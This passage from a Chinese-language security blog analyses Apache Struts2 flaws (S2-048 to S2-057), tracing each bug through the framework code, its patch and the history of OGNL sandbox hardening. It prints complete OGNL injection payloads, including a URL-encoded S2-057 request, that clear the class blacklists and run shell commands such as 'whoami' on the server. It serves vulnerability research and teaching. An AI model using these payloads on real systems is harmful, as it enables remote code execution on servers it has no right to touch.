<a id=__codelineno-24-13 name=__codelineno-24-13 href=#__codelineno-24-13></a><span class=p>(</span><span class=err>#</span><span class=n>cmds</span><span class=o>=</span><span class=p>(</span><span class=err>#</span><span class=n>iswin</span><span class=o>?</span><span class=p>{</span><span class=err>&#39;</span><span class=n>cmd</span><span class=p>.</span><span class=na>exe</span><span class=sc>&#39;,&#39;</span><span class=o>/</span><span class=n>c</span><span class=err>&#39;</span><span class=p>,</span><span class=err>#</span><span class=n>cmd</span><span class=p>}:{</span><span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span><span class=sc>&#39;,&#39;</span><span class=o>-</span><span class=n>c</span><span class=err>&#39;</span><span class=p>,</span><span class=err>#</span><span class=n>cmd</span><span class=p>})).</span><span class=w></span>
<a id=__codelineno-24-14 name=__codelineno-24-14 href=#__codelineno-24-14></a><span class=p>(</span><span class=err>#</span><span class=n>p</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>ProcessBuilder</span><span class=p>(</span><span class=err>#</span><span class=n>cmds</span><span class=p>)).</span><span class=w></span>
<a id=__codelineno-24-15 name=__codelineno-24-15 href=#__codelineno-24-15></a><span class=p>(</span><span class=err>#</span><span class=n>p</span><span class=p>.</span><span class=na>redirectErrorStream</span><span class=p>(</span><span class=kc>true</span><span class=p>)).</span><span class=w></span>
<a id=__codelineno-24-16 name=__codelineno-24-16 href=#__codelineno-24-16></a><span class=p>(</span><span class=err>#</span><span class=n>process</span><span class=o>=</span><span class=err>#</span><span class=n>p</span><span class=p>.</span><span class=na>start</span><span class=p>()).</span><span class=w></span>
<a id=__codelineno-24-17 name=__codelineno-24-17 href=#__codelineno-24-17></a><span class=p>(</span><span class=err>#</span><span class=n>ros</span><span class=o>=</span><span class=p>(</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=p>().</span><span class=na>getOutputStream</span><span class=p>())).</span><span class=w></span>
<a id=__codelineno-24-18 name=__codelineno-24-18 href=#__codelineno-24-18></a><span class=p>(</span><span class=nd>@org.apache.commons.io.IOUtils@copy</span><span class=p>(</span><span class=err>#</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>(),</span><span class=err>#</span><span class=n>ros</span><span class=p>)).</span><span class=w></span>
<a id=__codelineno-24-19 name=__codelineno-24-19 href=#__codelineno-24-19></a><span class=p>(</span><span class=err>#</span><span class=n>ros</span><span class=p>.</span><span class=na>flush</span><span class=p>())</span><span class=w></span>
<a id=__codelineno-24-20 name=__codelineno-24-20 href=#__codelineno-24-20></a><span class=p>}</span><span class=w></span>
</code></pre></div> <p>主要看5-10行，一开始的思路是直接用赋值的方式来覆盖存在限制的SecurityMemberAccess，但是现在有了<code>excludedClasses</code>的限制不能直接用这种方式来达成（具体看<code>SecurityMemberAccess.isAccessible</code>）。</p> <p>那么就看看能不能用setters去设置<code>SecurityMemberAccess</code></p> <p>这里就看<code>ognl.OgnlContext#setMemberAccess</code>，而这个context就是我们在OGNL表达式里用<code>#context</code>表示的</p> <p>那么直接用<code>#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)</code>就可以覆盖原有的MemberAccess，但是因为<code>#context</code>本身就是被禁止的类，我们不能直接调用他。</p> <p>我们需要首先去除掉<code>ExcludedPackageNames</code>和<code>ExcludedClasses</code></p> <p>来看看他是怎么设置的<code>com.opensymphony.xwork2.ognl.OgnlValueStack#setOgnlUtil</code></p> <p><img alt=image-20200521172344561 src=/images/talk_about_struts2/image-20200521172344561.png></p> <p>可以看到<code>securityMemberAccess</code>的相关禁用设置都是来自于<code>ognlUtil</code>，这意味着我们只需要清除掉<code>ognlUtil</code>的禁用设置就可以消除掉<code>securityMemberAccess</code>的限制。这是因为在jvm里面他们用的都是同一个实例。</p> <p>所以上面的POC中用struts2的container的方式去获取ognlUtil实例，并将其禁用设置全部清除掉</p> <p>那么后面再用<code>#context.setMemberAccess</code>就没有阻碍了</p> <p>后续的代码就是执行并回显了，跟前面的类似</p> <h4 id=_13>修复</h4> <p><img alt=image-20200521204140738 src=/images/talk_about_struts2/image-20200521204140738.png></p> <p>修复主要是不把message传入，放到了args的位置</p> <h3 id=15-s2-048>15. S2-048</h3> <p>这一部分不仔细说了，看https://www.freebuf.com/vuls/217482.html</p> <h3 id=16-s2-052>16. S2-052</h3> <p>影响范围:Struts 2.1.6 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12</p> <blockquote> <p>The REST Plugin is using a <code>XStreamHandler</code> with an instance of XStream for deserialization without any type filtering and this can lead to Remote Code Execution when deserializing XML payloads.</p> </blockquote> <p>struts2的rest插件注册了ContentTypeInterceptor来处理不同的content-type</p> <p><img alt=image-20200522100814912 src=/images/talk_about_struts2/image-20200522100814912.png></p> <p>针对xml类型，将调用<code>XStreamHandler</code>来处理</p> <p><code>org.apache.struts2.rest.ContentTypeInterceptor#intercept</code></p> <p><img alt=image-20200522101114659 src=/images/talk_about_struts2/image-20200522101114659.png></p> <p>根据request请求选择handler，这里我们传入<code>application/xml</code>类型，将使用<code>org.apache.struts2.rest.handler.XStreamHandler#toObject</code>来处理xml</p> <p><img alt=image-20200522101244620 src=/images/talk_about_struts2/image-20200522101244620.png></p> <p>这里用了最简单的调用方式（1.4.8版本），没有做xstream的相关安全处理，导致XStream反序列化</p> <p>所以我们传入构造好的XML就可以达到命令执行</p> <h4 id=poc_14>POC</h4> <p>这里的xml可以用我的ysomap去生成，把Content-Type设置成<code>application/xml</code>就可以了</p> <h4 id=_14>修复</h4> <p>S2-052跟以往的漏洞不一样，这里跟OGNL表达式并没有什么关系了，修复也比较简单</p> <p>升级XStream到了1.4.10版本，并且添加了安全措施</p> <p><img alt=image-20200522102217477 src=/images/talk_about_struts2/image-20200522102217477.png></p> <p>这里新添加了<code>AllowedClasses</code>、<code>AllowedClassNames</code>、<code>XStreamPermissionProvider</code>来设置每个类可以反序列化的对象列表</p> <p>也会添加一些默认的类</p> <p><img alt=image-20200522102927472 src=/images/talk_about_struts2/image-20200522102927472.png></p> <p>这里的用法就是XStream官方推荐的，采用白名单的方式来防止不安全的反序列化</p> <h3 id=17-s2-053>17. S2-053</h3> <p>影响版本:Struts 2.0.0 - 2.3.33 ,Struts 2.5 - Struts 2.5.10.1</p> <p>S2-053问题出在freemarker的标签内容可控时出现的问题</p> <p><img alt=image-20200522103937515 src=/images/talk_about_struts2/image-20200522103937515.png></p> <p>在action执行结束后，由于设置的类型为freemarker，所以结果交由freemarker来处理</p> <p><img alt=image-20200522111039529 src=/images/talk_about_struts2/image-20200522111039529.png></p> <p>关注对freemarker标签解析的类<code>org.apache.struts2.views.freemarker.tags.CallbackWriter#onStart</code></p> <p><img alt=image-20200522111238176 src=/images/talk_about_struts2/image-20200522111238176.png></p> <p>因为这里我们时url标签，所以由<code>org.apache.struts2.components.URL#start</code>来处理</p> <p><img alt=image-20200522111315111 src=/images/talk_about_struts2/image-20200522111315111.png></p> <p>回到了由<code>ServletUrlRenderer</code>来解析我们传入的OGNL表达式，跟S2-013一样，后续也是由<code>TextParseUtil.translateVariables</code>触发的</p> <h4 id=poc_15>POC</h4> <p>poc可以直接用S2-045的poc</p> <div class=highlight><pre><span></span><code><a id=__codelineno-25-1 name=__codelineno-25-1 href=#__codelineno-25-1></a><span class=o>%</span><span class=p>{(</span><span class=err>#</span><span class=n>dm</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=p>).(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>?</span><span class=p>(</span><span class=err>#</span><span class=n>_memberAccess</span><span class=o>=</span><span class=err>#</span><span class=n>dm</span><span class=p>):((</span><span class=err>#</span><span class=n>container</span><span class=o>=</span><span class=err>#</span><span class=n>context</span><span class=o>[</span><span class=err>&#39;</span><span class=n>com</span><span class=p>.</span><span class=na>opensymphony</span><span class=p>.</span><span class=na>xwork2</span><span class=p>.</span><span class=na>ActionContext</span><span class=p>.</span><span class=na>container</span><span class=err>&#39;</span><span class=o>]</span><span class=p>).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=o>=</span><span class=err>#</span><span class=n>container</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=nd>@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class=p>)).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=p>.</span><span class=na>getExcludedPackageNames</span><span class=p>().</span><span class=na>clear</span><span class=p>()).(</span><span class=err>#</span><span class=n>ognlUtil</span><span class=p>.</span><span class=na>getExcludedClasses</span><span class=p>().</span><span class=na>clear</span><span class=p>()).(</span><span class=err>#</span><span class=n>context</span><span class=p>.</span><span class=na>setMemberAccess</span><span class=p>(</span><span class=err>#</span><span class=n>dm</span><span class=p>)))).(</span><span class=err>#</span><span class=n>cmd</span><span class=o>=</span><span class=err>&#39;</span><span class=n>id</span><span class=err>&#39;</span><span class=p>).(</span><span class=err>#</span><span class=n>iswin</span><span class=o>=</span><span class=p>(</span><span class=nd>@java.lang.System@getProperty</span><span class=p>(</span><span class=err>&#39;</span><span class=n>os</span><span class=p>.</span><span class=na>name</span><span class=err>&#39;</span><span class=p>).</span><span class=na>toLowerCase</span><span class=p>().</span><span class=na>contains</span><span class=p>(</span><span class=err>&#39;</span><span class=n>win</span><span class=err>&#39;</span><span class=p>))).(</span><span class=err>#</span><span class=n>cmds</span><span class=o>=</span><span class=p>(</span><span class=err>#</span><span class=n>iswin</span><span class=o>?</span><span class=p>{</span><span class=err>&#39;</span><span class=n>cmd</span><span class=p>.</span><span class=na>exe</span><span class=sc>&#39;,&#39;</span><span class=o>/</span><span class=n>c</span><span class=err>&#39;</span><span class=p>,</span><span class=err>#</span><span class=n>cmd</span><span class=p>}:{</span><span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span><span class=sc>&#39;,&#39;</span><span class=o>-</span><span class=n>c</span><span class=err>&#39;</span><span class=p>,</span><span class=err>#</span><span class=n>cmd</span><span class=p>})).(</span><span class=err>#</span><span class=n>p</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>ProcessBuilder</span><span class=p>(</span><span class=err>#</span><span class=n>cmds</span><span class=p>)).(</span><span class=err>#</span><span class=n>p</span><span class=p>.</span><span class=na>redirectErrorStream</span><span class=p>(</span><span class=kc>true</span><span class=p>)).(</span><span class=err>#</span><span class=n>process</span><span class=o>=</span><span class=err>#</span><span class=n>p</span><span class=p>.</span><span class=na>start</span><span class=p>()).(</span><span class=nd>@org.apache.commons.io.IOUtils@toString</span><span class=p>(</span><span class=err>#</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>()))}</span><span class=w></span>
<a id=__codelineno-25-2 name=__codelineno-25-2 href=#__codelineno-25-2></a><span class=c1>// 记得编码</span><span class=w></span>
</code></pre></div> <h4 id=_15>修复</h4> <blockquote> <p>这次的修复是在FreemarkerManager中多了两行代码，</p> <div class=highlight><pre><span></span><code><a id=__codelineno-26-1 name=__codelineno-26-1 href=#__codelineno-26-1></a> LOG.debug(&quot;Sets NewBuiltinClassResolver to TemplateClassResolver.SAFER_RESOLVER&quot;, new String[0]);
<a id=__codelineno-26-2 name=__codelineno-26-2 href=#__codelineno-26-2></a>configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
</code></pre></div> <p>去看了一下TemplateClassResolver.SAFER_RESOLVER)的官方文档，</p> <div class=highlight><pre><span></span><code><a id=__codelineno-27-1 name=__codelineno-27-1 href=#__codelineno-27-1></a>TemplateClassResolver.SAFER_RESOLVER now disallows creating freemarker.template.utility.JythonRuntime and freemarker.template.utility.Execute. This change affects the behavior of the new built-in if FreeMarker was configured to use SAFER_RESOLVER, which is not the default until 2.4 and is hence improbable.
</code></pre></div> <p>大致意思应该就是禁止了freemarker的RCE，具体我对freemarker不太了解，就不去误人子弟了。</p> </blockquote> <p>修复直接参考https://www.freebuf.com/vuls/217482.html</p> <h3 id=18-s2-055>18. S2-055</h3> <p>影响范围：Struts 2.5 - Struts 2.5.14</p> <p>S2-055漏洞原理跟S2-052一样，由jackson库处理json内容时产生的漏洞，这里默认不是用jackson处理json内容的，得在struts.xml配置</p> <div class=highlight><pre><span></span><code><a id=__codelineno-28-1 name=__codelineno-28-1 href=#__codelineno-28-1></a><span class=nt>&lt;bean</span> <span class=na>type=</span><span class=s>&quot;org.apache.struts2.rest.handler.ContentTypeHandler&quot;</span> <span class=na>name=</span><span class=s>&quot;jackson&quot;</span> <span class=na>class=</span><span class=s>&quot;org.apache.struts2.rest.handler.JacksonLibHandler&quot;</span><span class=nt>/&gt;</span>
<a id=__codelineno-28-2 name=__codelineno-28-2 href=#__codelineno-28-2></a>    <span class=nt>&lt;constant</span> <span class=na>name=</span><span class=s>&quot;struts.rest.handlerOverride.json&quot;</span> <span class=na>value=</span><span class=s>&quot;jackson&quot;</span><span class=nt>/&gt;</span>
</code></pre></div> <p>这里本身是因为jackson反序列化问题产生的，后面抽空分析一下这个jackson，这里不继续分析了</p> <p>因为需要配置才可以打，所以这里的危害并没有想xstream一样严重</p> <p>具体分析见<a href=http://xxlegend.com/2017/12/06/S2-055漏洞环境搭建与分析/ >http://xxlegend.com/2017/12/06/S2-055%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%88%86%E6%9E%90/</a></p> <h3 id=19-s2-057>19. S2-057</h3> <p>影响范围：Struts 2.0.4 - Struts 2.3.34, Struts 2.5.0 - Struts 2.5.16</p> <blockquote> <p>北京时间8月22日13时，Apache官方发布通告公布了Struts2中一个远程代码执行漏洞（CVE-2018-11776）。该漏洞在两种情况下存在，第一，在xml配置中未设置namespace值，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。第二，使用未设置 value和action值的url标签，且上层动作配置（upper action(s) configurations）中未设置或用通配符namespace值。</p> <p>https://paper.seebug.org/682/</p> </blockquote> <p>这里一种配置方案是</p> <p><img alt=image-20200522152919691 src=/images/talk_about_struts2/image-20200522152919691.png></p> <p>没有配置namespace，访问s2057.action都会导向test.action，这里处理redirectAction的是</p> <p><img alt=image-20200522153229727 src=/images/talk_about_struts2/image-20200522153229727.png></p> <p><code>org.apache.struts2.dispatcher.ServletActionRedirectResult#execute</code></p> <p><img alt=image-20200522153556365 src=/images/talk_about_struts2/image-20200522153556365.png></p> <p><code>ServletActionRedirectResult</code>会将namespace一起拼接进location，比如<code>/s2vuls/${1*2}/s2057.action</code>,其namespace为<code>/${1*2}</code>,actionName为跳转的test，最终location为<code>/${1*2}/test.action</code>。到这里我们就引入了OGNL表达式，看后续的一个处理</p> <p><code>org.apache.struts2.dispatcher.StrutsResultSupport#execute</code></p> <p><img alt=image-20200522154209594 src=/images/talk_about_struts2/image-20200522154209594.png></p> <p>到这里，就开始熟悉起来了，就是S2-012的漏洞触发点</p> <p><img alt=image-20200522154315511 src=/images/talk_about_struts2/image-20200522154315511.png></p> <p>传入了<code>TextParseUtil.translateVariables</code>，到这里就结束了，后续将调用OGNL.getValue</p> <h4 id=poc_16>POC</h4> <p>在2.3.x版本，可以直接用S2-045的poc打</p> <div class=highlight><pre><span></span><code><a id=__codelineno-29-1 name=__codelineno-29-1 href=#__codelineno-29-1></a>/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D%27whoami%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd%27%2C%27/c%27%2C%23cmd%7D%3A%7B%27/bin/bash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28@org.apache.struts2.ServletActionContext@getResponse%28%29.getOutputStream%28%29%29%29.%28@org.apache.commons.io.IOUtils@copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D/s2057.action
</code></pre></div> <p>而对于2.5.x版本，我们需要好好分析一下</p> <div class=highlight><pre><span></span><code><a id=__codelineno-30-1 name=__codelineno-30-1 href=#__codelineno-30-1></a><span class=n>$</span><span class=p>{</span><span class=w></span>
<a id=__codelineno-30-2 name=__codelineno-30-2 href=#__codelineno-30-2></a><span class=p>(</span><span class=err>#</span><span class=n>ct</span><span class=o>=</span><span class=err>#</span><span class=n>request</span><span class=o>[</span><span class=err>&#39;</span><span class=n>struts</span><span class=p>.</span><span class=na>valueStack</span><span class=err>&#39;</span><span class=o>]</span><span class=p>.</span><span class=na>context</span><span class=p>).</span><span class=w></span>
<a id=__codelineno-30-3 name=__codelineno-30-3 href=#__codelineno-30-3></a><span class=p>(</span><span class=err>#</span><span class=n>cr</span><span class=o>=</span><span class=err>#</span><span class=n>ct</span><span class=o>[</span><span class=err>&#39;</span><span class=n>com</span><span class=p>.</span><span class=na>opensymphony</span><span class=p>.</span><span class=na>xwork2</span><span class=p>.</span><span class=na>ActionContext</span><span class=p>.</span><span class=na>container</span><span class=err>&#39;</span><span class=o>]</span><span class=p>).</span><span class=w></span>
<a id=__codelineno-30-4 name=__codelineno-30-4 href=#__codelineno-30-4></a><span class=p>(</span><span class=err>#</span><span class=n>ou</span><span class=o>=</span><span class=err>#</span><span class=n>cr</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=nd>@com.opensymphony.xwork2.ognl.OgnlUtil@class</span><span class=p>)).</span><span class=w></span>
<a id=__codelineno-30-5 name=__codelineno-30-5 href=#__codelineno-30-5></a><span class=p>(</span><span class=err>#</span><span class=n>ou</span><span class=p>.</span><span class=na>setExcludedClasses</span><span class=p>(</span><span class=err>&#39;&#39;</span><span class=p>)).</span><span class=w></span>
<a id=__codelineno-30-6 name=__codelineno-30-6 href=#__codelineno-30-6></a><span class=p>(</span><span class=err>#</span><span class=n>ou</span><span class=p>.</span><span class=na>setExcludedPackageNames</span><span class=p>(</span><span class=err>&#39;&#39;</span><span class=p>)).</span><span class=w></span>
<a id=__codelineno-30-7 name=__codelineno-30-7 href=#__codelineno-30-7></a><span class=p>(</span><span class=err>#</span><span class=n>dm</span><span class=o>=</span><span class=nd>@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</span><span class=p>).</span><span class=w></span>
<a id=__codelineno-30-8 name=__codelineno-30-8 href=#__codelineno-30-8></a><span class=p>(</span><span class=err>#</span><span class=n>ct</span><span class=p>.</span><span class=na>setMemberAccess</span><span class=p>(</span><span class=err>#</span><span class=n>dm</span><span class=p>)).(</span><span class=err>#</span><span class=n>cmd</span><span class=o>=</span><span class=err>&#39;</span><span class=n>whoami</span><span class=err>&#39;</span><span class=p>).</span><span class=w></span>
<a id=__codelineno-30-9 name=__codelineno-30-9 href=#__codelineno-30-9></a><span class=p>(</span><span class=err>#</span><span class=n>iswin</span><span class=o>=</span><span class=p>(</span><span class=nd>@java.lang.System@getProperty</span><span class=p>(</span><span class=err>&#39;</span><span class=n>os</span><span class=p>.</span><span class=na>name</span><span class=err>&#39;</span><span class=p>).</span><span class=na>toLowerCase</span><span class=p>().</span><span class=na>contains</span><span class=p>(</span><span class=err>&#39;</span><span class=n>win</span><span class=err>&#39;</span><span class=p>))).</span><span class=w></span>
<a id=__codelineno-30-10 name=__codelineno-30-10 href=#__codelineno-30-10></a><span class=p>(</span><span class=err>#</span><span class=n>cmds</span><span class=o>=</span><span class=p>(</span><span class=err>#</span><span class=n>iswin</span><span class=o>?</span><span class=p>{</span><span class=err>&#39;</span><span class=n>cmd</span><span class=sc>&#39;,&#39;</span><span class=o>/</span><span class=n>c</span><span class=err>&#39;</span><span class=p>,</span><span class=err>#</span><span class=n>cmd</span><span class=p>}:{</span><span class=err>&#39;</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span><span class=sc>&#39;,&#39;</span><span class=o>-</span><span class=n>c</span><span class=err>&#39;</span><span class=p>,</span><span class=err>#</span><span class=n>cmd</span><span class=p>})).</span><span class=w></span>
<a id=__codelineno-30-11 name=__codelineno-30-11 href=#__codelineno-30-11></a><span class=p>(</span><span class=err>#</span><span class=n>p</span><span class=o>=</span><span class=k>new</span><span class=w> </span><span class=n>java</span><span class=p>.</span><span class=na>lang</span><span class=p>.</span><span class=na>ProcessBuilder</span><span class=p>(</span><span class=err>#</span><span class=n>cmds</span><span class=p>)).(</span><span class=err>#</span><span class=n>p</span><span class=p>.</span><span class=na>redirectErrorStream</span><span class=p>(</span><span class=kc>true</span><span class=p>)).</span><span class=w></span>
<a id=__codelineno-30-12 name=__codelineno-30-12 href=#__codelineno-30-12></a><span class=p>(</span><span class=err>#</span><span class=n>process</span><span class=o>=</span><span class=err>#</span><span class=n>p</span><span class=p>.</span><span class=na>start</span><span class=p>()).</span><span class=w></span>
<a id=__codelineno-30-13 name=__codelineno-30-13 href=#__codelineno-30-13></a><span class=p>(</span><span class=err>#</span><span class=n>ros</span><span class=o>=</span><span class=p>(</span><span class=nd>@org.apache.struts2.ServletActionContext@getResponse</span><span class=p>().</span><span class=na>getOutputStream</span><span class=p>())).</span><span class=w></span>
<a id=__codelineno-30-14 name=__codelineno-30-14 href=#__codelineno-30-14></a><span class=p>(</span><span class=nd>@org.apache.commons.io.IOUtils@copy</span><span class=p>(</span><span class=err>#</span><span class=n>process</span><span class=p>.</span><span class=na>getInputStream</span><span class=p>(),</span><span class=err>#</span><span class=n>ros</span><span class=p>)).(</span><span class=err>#</span><span class=n>ros</span><span class=p>.</span><span class=na>flush</span><span class=p>())</span><span class=w></span>
<a id=__codelineno-30-15 name=__codelineno-30-15 href=#__codelineno-30-15></a><span class=p>}</span><span class=w></span>
</code></pre></div> <p>从poc来看，从第7行开始都是我们熟悉的操作，那么前面多了那么多是在做什么？</p> <p>参考：https://paper.seebug.org/794/#35-struts-2516</p> <p>在struts2 2.5.13版本之后，ognl库进行了更新，从3.1.12-&gt;3.1.15，其主要的一个变化是禁止访问<code>context.map</code>，OgnlContext的get、put、remove函数中都删除了对当前context的操作</p> <p>此外，excluded相关的集合被设置为不可变，无法通过clear的方式来清除</p> <p>针对上面两种的绕过</p> <blockquote> <p>文章提出了这么一种思路:</p> <ul> <li>没有办法使用<code>context.map</code>，可以调用<code>attr</code>，前文说过<code>attr</code>中保存着整个<code>context</code>的变量与方法，可以通过<code>attr</code>中的方法返回给我们一个<code>context.map</code>。</li> <li>没有办法直接调用<code>excludedClasses</code>，也就不能使用<code>clear</code>方法来清空，但是还可以利用<code>setter</code>来把<code>excludedClasses</code>给设置成空</li> <li>清空了黑名单，我们就可以利用<code>DefaultMemberAccess</code>来覆盖<code>_memberAccess</code>，来执行静态方法了。</li> </ul> <p>而这里又会出现一个问题，当我们使用<code>OgnlUtil</code>的<code>setExcludedClasses</code>和<code>setExcludedPackageNames</code>将黑名单置空时并非是对于源（全局的OgnlUtil）进行置空，也就是说<code>_memberAccess</code>是源数据的一个引用，就像前文所说的，在每次<code>createAction</code>时都是通过<code>setOgnlUtil</code>利用全局的源数据创建一个引用，这个引用就是一个<code>MemberAccess</code>对象，也就是<code>_memberAccess</code>。所以这里只会影响这次请求的<code>OgnlUtil</code>而并未重新创建一个新的<code>_memberAccess</code>对象，所以旧的<code>_memberAccess</code>对象仍未改变。</p> <p>而突破这种限制的方式就是再次发送一个请求，将上一次请求已经置空的<code>OgnlUitl</code>作为源重新创建一个<code>_memberAccess</code>，这样在第二次请求中<code>_memberAccess</code>就是黑名单被置空的情况，这个时候就释放了<code>DefaultMemberAccess</code>，就可以进行正常的覆盖以及执行静态方法。</p> </blockquote> <p>看过上面的分析后再来看poc，第二行获取了context，第3 4 5 6行清除了excluded相关的集合，但其当前的请求黑名单还是存在的，所以在2.5.x版本我们需要发送两次这个poc，第一次清楚黑名单，第二次覆盖<code>_memberAccess</code>并调用静态函数</p> <h2 id=0x03>0x03 总结</h2> <hr> <p>在分析过程中，参考了很多师傅们的笔记，这里特别感谢一下XD</p> <p>从整个s2漏洞的历程来看，能看到很多漏洞其实利用点是相似的，只是说从哪个入口进去可能有所不同。这种漏洞的分析我认为用数据流分析是非常合适的。lgtm的师傅就用了他们的codeql发现了S2-057这个漏洞。</p> <p>但是官方在一次次修复中，对于ognl表达式的执行限制的越来越多，使得如今就算出现ognl表达式注入也很难造成RCE的效果。</p> <p>这里我们可以直接看<a href="https://paper.seebug.org/users/author/?nickname=lucifaer">lucifaer</a>师傅的那篇文章</p> <p>从时间线来看，</p> <ol> <li>struts2 2.3.14.1之前，ognl表达式执行没有什么障碍；2.3.14.1增加了<code>SecurityMemberAccess</code>，禁止静态函数执行<code>allowStaticMethodAccess=false</code>，在ognl表达式里面可以重新置为true；后续这个值被改成了final，无法被更改</li> <li>struts2 2.3.20之前，虽然不能改<code>allowStaticMethodAccess</code>，但是可以通过构造函数的方式绕过；2.3.20之后，增加了黑名单</li> <li>struts2 2.3.29之前，通过<code>#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS</code>这种方式初始化，清空黑名单；2.3.29之后，新增了黑名单，限制了这种方式的执行</li> <li>struts2 2.3.34/2.5.16之前，通过container实例化<code>ognlUtil</code>，清空黑名单，详细见S2-045；之后禁止了context.map的访问和excludedClasses不可变，不能通过clear清楚</li> <li>struts2 2.5.17之前，通过request中获取context，绕过context.map禁止访问的限制，详细见S2-057；之后新增了黑名单，完全禁止通过ognl的包来对stack做操作</li> <li>后续几个版本也更新了很多安全措施，具体见lucifaer师傅的文章</li> </ol> <p>在分析完struts2之后，也改变了对很有名的漏洞的感官，以前总觉得struts漏洞都是比较复杂的，但是现在想想有精彩复杂的地方也会有很傻的地方。</p> <p>不能对还没有分析过的框架或者应用持有畏惧之心，共勉XD</p> </article> </div> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> 回到页面顶部 </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=页脚> <a href=../talk-about-xstream-deserialization-20200418/ class="md-footer__link md-footer__link--prev" aria-label="上一页: 回顾XStream反序列化漏洞" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 上一页 </span> 回顾XStream反序列化漏洞 </div> </div> </a> <a href=../../2019/mycncart-v2-0-0-3-sqli-20190225/ class="md-footer__link md-footer__link--next" aria-label="下一页: mycncart sqli" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> 下一页 </span> mycncart sqli </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> Made with <a href=https://squidfunk.github.io/mkdocs-material/ target=_blank rel=noopener> Material for MkDocs </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["navigation.tabs", "navigation.top", "navigation.expand"], "search": "../../../assets/javascripts/workers/search.ecf98df9.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\uff0c\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script> <script src=../../../assets/javascripts/bundle.9c69f0bc.min.js></script> </body> </html>